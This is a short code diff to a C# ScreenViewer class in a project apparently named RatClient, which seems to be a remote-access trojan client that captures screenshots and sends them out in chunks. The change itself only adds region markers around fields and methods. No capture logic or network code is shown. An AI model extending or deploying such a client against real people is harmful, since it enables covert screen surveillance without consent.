@@ -11,12 +11,15 @@ namespace RatClient.Features
 {
     public class ScreenViewer
     {
+        #region Variables
         private System.Timers.Timer screenshotTimer;
         private Queue<string> screenshotChunks = new Queue<string>();
         private bool isSendingScreenshot = false;
         private int bufferSize;
         private Action<object> sendJson;
+        #endregion
 
+        #region Methods
         public ScreenViewer(int bufferSize, Action<object> sendJson)
         {
             this.bufferSize = bufferSize;
@@ -111,5 +114,6 @@ namespace RatClient.Features
                 return memoryStream.ToArray();
             }
         }
+        #endregion
     }
 }
